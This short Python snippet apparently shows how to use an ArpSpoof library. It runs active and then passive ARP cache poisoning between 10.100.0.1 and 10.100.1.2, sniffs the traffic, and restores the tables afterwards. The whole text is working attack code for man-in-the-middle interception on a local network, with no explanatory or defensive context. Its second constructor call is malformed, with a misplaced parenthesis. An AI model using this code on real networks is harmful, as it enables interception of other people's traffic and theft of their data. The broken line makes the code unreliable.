from ArpSpoof import SpooferARP

spoofer = SpooferARP('10.100.0.1', '10.100.1.2')
spoofer.active_cache_poisonning()

spoofer = SpooferARP('10.100.0.1', '10.100.1.2'), conf.iface, False, 0.5)
spoofer.passive_cache_poisonning(asynchronous=True)
spoofer.run = False
spoofer.sniffer.stop()
spoofer.restore()
